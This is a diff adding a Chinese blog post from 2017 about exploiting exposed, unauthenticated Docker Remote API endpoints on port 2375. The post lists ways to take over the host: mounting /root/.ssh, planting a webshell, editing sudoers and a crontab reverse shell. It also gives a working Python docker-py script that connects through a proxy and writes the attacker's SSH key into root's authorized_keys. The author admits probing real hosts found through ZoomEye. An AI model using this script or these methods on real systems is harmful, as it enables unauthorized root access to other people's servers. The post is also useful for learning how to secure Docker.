@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta property="og:description" content="">
+    <meta property="og:type" content="website">
+    <meta name="description" content="">
+    <meta name="keyword"  content="">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+        关于 Docker Remote API未授权访问 的一些研究 - undefined
+        
+    </title>
+
+    <!-- Custom CSS -->
+    
+<link rel="stylesheet" href="/css/aircloud.css">
+
+    
+<link rel="stylesheet" href="/css/gitment.css">
+
+    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
+    <link href="//at.alicdn.com/t/font_620856_28hi1hpxx24.css" rel="stylesheet" type="text/css">
+    <!-- ga & ba script hoook -->
+    <script></script>
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body>
+
+<div class="site-nav-toggle" id="site-nav-toggle">
+    <button>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+    </button>
+</div>
+
+<div class="index-about">
+    <i>  </i>
+</div>
+
+<div class="index-container">
+    
+    <div class="index-left">
+        
+<div class="nav" id="nav">
+    <div class="avatar-name">
+        <div class="avatar ">
+            <img src="/img/avatar.jpeg" />
+        </div>
+        <div class="name">
+            <i>seaii</i>
+        </div>
+    </div>
+    <div class="contents" id="nav-content">
+        <ul>
+            <li >
+                <a href="/">
+                    <i class="iconfont icon-shouye1"></i>
+                    <span>HOME</span>
+                </a>
+            </li>
+            <li >
+                <a href="/tags">
+                    <i class="iconfont icon-biaoqian1"></i>
+                    <span>TAGS</span>
+                </a>
+            </li>
+            <li >
+                <a href="/archives">
+                    <i class="iconfont icon-guidang2"></i>
+                    <span>ARCHIVES</span>
+                </a>
+            </li>
+            <li >
+                <a href="/collect/">
+                    <i class="iconfont icon-shoucang1"></i>
+                    <span>COLLECT</span>
+                </a>
+            </li>
+            <li >
+                <a href="/about/">
+                    <i class="iconfont icon-guanyu2"></i>
+                    <span>ABOUT</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    
+        <div id="toc" class="toc-article">
+    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">0x01漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">0x02漏洞利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA%E5%8F%8A%E4%B8%80%E4%BA%9B%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C"><span class="toc-text">0x03漏洞环境的搭建及一些准备工作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">0x04漏洞利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x05%E6%B5%8B%E8%AF%95%E6%97%B6%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98"><span class="toc-text">0x05测试时遇到的问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x06%E5%86%99%E5%9C%A8%E6%9C%80%E5%90%8E"><span class="toc-text">0x06写在最后</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x07%E5%90%8E%E7%BB%AD"><span class="toc-text">0x07后续</span></a></li></ol>
+</div>
+    
+</div>
+
+
+<div class="search-field" id="search-field">
+    <div class="search-bg" id="search-bg"></div>
+    <div class="search-container">
+        <div class="search-input">
+            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
+            <input id="search-input"/>
+            <span id="begin-search">search</span>
+        </div>
+        <div class="search-result-container" id="search-result-container">
+
+        </div>
+    </div>
+</div>
+
+        <div class="index-about-mobile">
+            <i>  </i>
+        </div>
+    </div>
+    
+    <div class="index-middle">
+        <!-- Main Content -->
+        
+
+
+<div class="post-container">
+    <div class="post-title">
+        关于 Docker Remote API未授权访问 的一些研究
+    </div>
+
+    <div class="post-meta">
+        <span class="attr">Post：<span>2017-01-31 22:56:00</span></span>
+        
+        </span>
+        <span class="attr">Visit：<span id="busuanzi_value_page_pv"></span>
+</span>
+</span>
+    </div>
+    <div class="post-content ">
+        <p>最近正在学习Docker，一直好奇Docker有没有安全问题，在一次查询Docker命令的时候偶然看到了这样一篇文章<a href="http://cb.drops.wiki/drops/papers-15892.html" target="_blank">新姿势之Docker Remote API未授权访问漏洞分析和利用</a>，激起了我极大的好奇心，踏上了一条不归路。。。</p>
+<span id="more"></span>
+
+<h3 id="0x01漏洞分析"><a href="#0x01漏洞分析" class="headerlink" title="0x01漏洞分析"></a>0x01漏洞分析</h3><p>这个漏洞被发现是因为安装<code>docker swarm</code>需要开启2375端口，绑定了一个Docker Remote API的服务，可以通过HTTP、Python、Go调用API来操作Docker。在安装时由于疏忽或安全意识的欠缺导致2375端口暴露在外网，导致所有人都可以远程操作这台主机上的Docker。<br>　　ps. 嘴笨讲不清楚，大家还是看上面的文章吧。。。。。</p>
+<h3 id="0x02漏洞利用"><a href="#0x02漏洞利用" class="headerlink" title="0x02漏洞利用"></a>0x02漏洞利用</h3><p>大牛给出了很多姿势（自己水平不足，没想出来新的。。。），总结一下：</p>
+<ol>
+<li>Docker是以root权限运行的，这是所有姿势的前提</li>
+<li>Docker在运行一个容器的时候可以将宿主机上的一个目录挂载到容器内的一个目录，我们可以参考<code>redis未授权访问漏洞</code>，将宿主机的<code>/root/.ssh</code>目录挂载到容器上，然后写入公钥。如果有web目录的话，最差也能上一个webshell。</li>
+<li>有些服务器不允许root登录，可以写入其他用户的.ssh&#x2F;目录下（通过查看<code>/etc/ssh/sshd_config</code>目录），然后修改<code>/etc/sudoer</code>中的文件，配置为sudo免密码，切换为root</li>
+<li>通过crontab写计划任务反弹shell<br>……</li>
+</ol>
+<h3 id="0x03漏洞环境的搭建及一些准备工作"><a href="#0x03漏洞环境的搭建及一些准备工作" class="headerlink" title="0x03漏洞环境的搭建及一些准备工作"></a>0x03漏洞环境的搭建及一些准备工作</h3><ol>
+<li>这次使用一台装有Docker的Ubuntu14.04的虚拟机来模拟漏洞环境</li>
+<li>开启2375端口。方便起见没有安装swarm，选择直接开启2375端口。在Ubuntu下可以修改<br> <code>/etc/default/docker</code>文件的DOCKER_OPTS为 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DOCKER_OPTS=&quot;-H unix:///var/run/docker.sock -H tcp://0.0.0.0:2375&quot;</span><br><span class="line">service docker restart    重启Docker即可</span><br></pre></td></tr></table></figure>
+ ps. 目前只测试了Ubuntu环境，其他不清楚，kali2.0失败。。。</li>
+<li>API的选择。API的调用方式有很多种，可以使用</li>
+</ol>
+<ul>
+<li>HTTP方式 <a href="https://docs.docker.com/engine/api/v1.25/" target="_blank">https://docs.docker.com/engine/api/v1.25/</a><br>通过利用Curl进行调用 <a href="http://www.open-open.com/lib/view/open1419921028828.html" target="_blank">http://www.open-open.com/lib/view/open1419921028828.html</a> 这里有一些简单的使用</li>
+<li>Docker自己封装了一个docker-py来管理docker： <a href="https://github.com/docker/docker-py" target="_blank">https://github.com/docker/docker-py</a><br>这是说明文档，写的很详细： <a href="https://docker-py.readthedocs.io/en/stable/containers.html" target="_blank">https://docker-py.readthedocs.io/en/stable/containers.html</a></li>
+<li>可以直接使用Docker命令，使用-H参数<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker -H IP:PORT your_command</span><br></pre></td></tr></table></figure>
+这里我选择了Python（没错，我爱py~~），需要安装docker-py模块<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install docker 或者 easy_install docker 即可 </span><br></pre></td></tr></table></figure></li>
+</ul>
+<ol start="4">
+<li>生成ssh公钥。<br>Linux下可以参考这篇文章<a href="http://jingyan.baidu.com/article/2fb0ba4043124a00f2ec5f0f.html" target="_blank">http://jingyan.baidu.com/article/2fb0ba4043124a00f2ec5f0f.html</a>，同时介绍了Client端和Server端的操作，我在windows下直接用Xshell一键生成的。</li>
+</ol>
+<h3 id="0x04漏洞利用"><a href="#0x04漏洞利用" class="headerlink" title="0x04漏洞利用"></a>0x04漏洞利用</h3><p>首先访问<a target="_blank" rel="noopener" href="http://localhost:2375/containers/json?all=1">http://localhost:2375/containers/json?all=1</a><br>相当于docker ps -a<br><img src="https://seaii-blog.com/usr/uploads/2017/01/4270715243.jpg" alt="QQ截图20170131230501 (2).jpg"><br>运行代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> docker</span><br><span class="line"><span class="keyword">import</span> socks</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="comment">#开启代理（走ss，另一篇文章详细介绍）</span></span><br><span class="line">socks.set_default_proxy(socks.SOCKS5, <span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">1080</span>)</span><br><span class="line">socket.socket = socks.socksocket</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&#x27;&#x27;</span></span><br><span class="line">cli = docker.DockerClient(base_url=<span class="string">&#x27;tcp://&#x27;</span>+ip+<span class="string">&#x27;:2375&#x27;</span>, version=<span class="string">&#x27;auto&#x27;</span>) </span><br><span class="line"><span class="comment">#端口不一定为2375，指定version参数是因为本机和远程主机的API版本可能不同，指定为auto可以自己判断版本</span></span><br><span class="line">image = cli.images.<span class="built_in">list</span>()[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#读取生成的公钥</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;id_rsa_2048.pub&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">sshKey = f.read()</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">	cli.containers.run(</span><br><span class="line">		image=image.tags[<span class="number">0</span>], </span><br><span class="line">		command=<span class="string">&#x27;sh -c &quot;echo &#x27;</span>+sshKey+<span class="string">&#x27; &gt;&gt; /usr/games/authorized_keys&quot;&#x27;</span>, <span class="comment">#这里卡了很久，这是正确有效的写法，在有重定向时直接写命令是无法正确执行的，记得加上sh -c</span></span><br><span class="line">		volumes=&#123;<span class="string">&#x27;/root/.ssh&#x27;</span>:&#123;<span class="string">&#x27;bind&#x27;</span>: <span class="string">&#x27;/usr/games&#x27;</span>, <span class="string">&#x27;mode&#x27;</span>: <span class="string">&#x27;rw&#x27;</span>&#125;&#125;, <span class="comment">#找一个基本所有环境都有的目录</span></span><br><span class="line">		name=<span class="string">&#x27;test&#x27;</span> <span class="comment">#给容器命名，便于后面删除</span></span><br><span class="line">	)</span><br><span class="line"><span class="keyword">except</span> docker.errors.ContainerError <span class="keyword">as</span> e:</span><br><span class="line">	<span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line"><span class="comment">#删除容器</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    container = cli.containers.get(<span class="string">&#x27;test&#x27;</span>)</span><br><span class="line">    container.remove()</span><br><span class="line"><span class="keyword">except</span> Expection <span class="keyword">as</span> e:</span><br><span class="line">    <span class="keyword">continue</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>代码很简单，毕竟是自己家的东西~~<br>　　可以看到authorized_keys成功写入，尝试登录，成功。<br><img src="https://seaii-blog.com/usr/uploads/2017/01/1272360029.jpg" alt="QQ截图20170131231356.jpg"></p>
+<p><img src="https://seaii-blog.com/usr/uploads/2017/01/3075037240.jpg" alt="QQ截图20170131231243.jpg"></p>
+<h3 id="0x05测试时遇到的问题"><a href="#0x05测试时遇到的问题" class="headerlink" title="0x05测试时遇到的问题"></a>0x05测试时遇到的问题</h3><p>在执行代码对主机进行测试时，碰到了几个问题，总结如下：</p>
+<ol>
+<li>API版本小于1.5，导致调用API失败</li>
+<li>命令执行返回Permission denied，权限不够，可能用户安全意识较高，并没有使用root账户运行Docker</li>
+<li>主机上并没有镜像。。。</li>
+<li>连接超时、连接被关闭</li>
+<li><code>还有一个很诡异的问题，有时某个镜像在运行容器时会持续很长时间，后面可能是强制退出了，执行了下面的代码。但是运行的容器并没有停止，也就不能被删除，导致报容器正在运行无法删除和容器已存在的错误。</code></li>
+</ol>
+<h3 id="0x06写在最后"><a href="#0x06写在最后" class="headerlink" title="0x06写在最后"></a>0x06写在最后</h3><p>说实话，在读完文章之后我的极为震撼，因为我手中的docker学习资料说docker是非常安全的，当然在官方文档已经明确标出不要把端口暴露在公网上，也有大牛对此持不同看法： <a href="https://yq.aliyun.com/articles/48689" target="_blank">所谓的”新姿势之Docker Remote API未授权访问漏洞分析和利用”</a>。但安全问题始终是一个“木桶问题”，取决于它最短的那块木板。耍大刀把自己砍死了固然不能怪刀，总有那么一些人不知道这大刀能伤人伤自己。。。。用zoomeye搜索并简单测试了一下，还是有些主机有问题。。。<br>最后贴一篇深入分析的文章<a href="https://yq.aliyun.com/articles/57126?spm=5176.100239.blogrightarea48689.19.q3MgOI" target="_blank">DockerCon 2016 深度解读: Docker安全</a></p>
+<h3 id="0x07后续"><a href="#0x07后续" class="headerlink" title="0x07后续"></a>0x07后续</h3><ul>
+<li><p><a href="https://www.secpulse.com/archives/55928.html" target="_blank">Docker Remote api在安全中的应用杂谈</a></p>
+</li>
+</ul>
+
+        
+        <br />
+        <div id="comment-container">
+        </div>
+        <div id="disqus_thread"></div>
+        <div id="lv-container"></div>
+        <div class="giscus"></div>
+    </div>
+</div>
+
+    </div>
+</div>
+
+
+<footer class="footer">
+    <ul class="list-inline text-center">
+        
+        
+
+        
+
+        
+
+        
+
+        
+
+    </ul>
+    
+    <p>
+        <span id="busuanzi_container_site_pv">
+            <span id="busuanzi_value_site_pv"></span>PV
+        </span>
+        <span id="busuanzi_container_site_uv">
+            <span id="busuanzi_value_site_uv"></span>UV
+        </span>
+        Created By <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>  Theme <a target="_blank" rel="noopener" href="https://github.com/aircloud/hexo-theme-aircloud">AirCloud</a></p>
+</footer>
+
+
+
+
+</body>
+
+<script>
+    // We expose some of the variables needed by the front end
+    window.hexo_search_path = ""
+    window.hexo_root = "/"
+    window.isPost = true
+</script>
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+
+<script src="/js/index.js"></script>
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+
+</html>
